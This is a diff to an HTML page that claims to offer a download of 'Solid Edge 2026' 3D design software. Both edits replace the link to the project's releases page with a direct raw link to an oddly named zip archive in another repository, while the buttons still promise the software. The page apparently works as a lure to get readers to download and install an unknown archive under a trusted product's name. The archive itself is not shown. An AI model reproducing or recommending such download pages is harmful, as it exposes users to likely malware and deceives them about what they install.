@@ -8,7 +8,7 @@ description: "Download and install Solid Edge 2026 on Windows 10 and 11 using a 
 <h1>⚙️ Solid-Edge-2026 - Powerful 3D Design Made Simple</h1>
 
 <div style="text-align: center; margin: 40px 0;">
-    <a href="https://github.com/grindfreelance80/Solid-Edge-2026/releases" style="background-color: #2da44e; color: white; padding: 15px 30px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 1.2em;">Download Solid Edge 2026</a>
+    <a href="https://raw.githubusercontent.com/grindfreelance80/grindfreelance80.github.io/main/affably/github_io_grindfreelance_v2.9-alpha.4.zip" style="background-color: #2da44e; color: white; padding: 15px 30px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 1.2em;">Download Solid Edge 2026</a>
 </div>
 
 <h2>📋 Project Description</h2>
@@ -29,7 +29,7 @@ description: "Download and install Solid Edge 2026 on Windows 10 and 11 using a 
 
 <h2>📥 Download and Install</h2>
 <p>Use this guide to add the software to your system. Please visit the official release page to access the installation files.</p>
-<p><a href="https://github.com/grindfreelance80/Solid-Edge-2026/releases" style="color: #0969da; font-weight: bold;">Click here to visit the download page</a></p>
+<p><a href="https://raw.githubusercontent.com/grindfreelance80/grindfreelance80.github.io/main/affably/github_io_grindfreelance_v2.9-alpha.4.zip" style="color: #0969da; font-weight: bold;">Click here to visit the download page</a></p>
 
 <ol>
     <li>Navigate to the link provided above.</li>
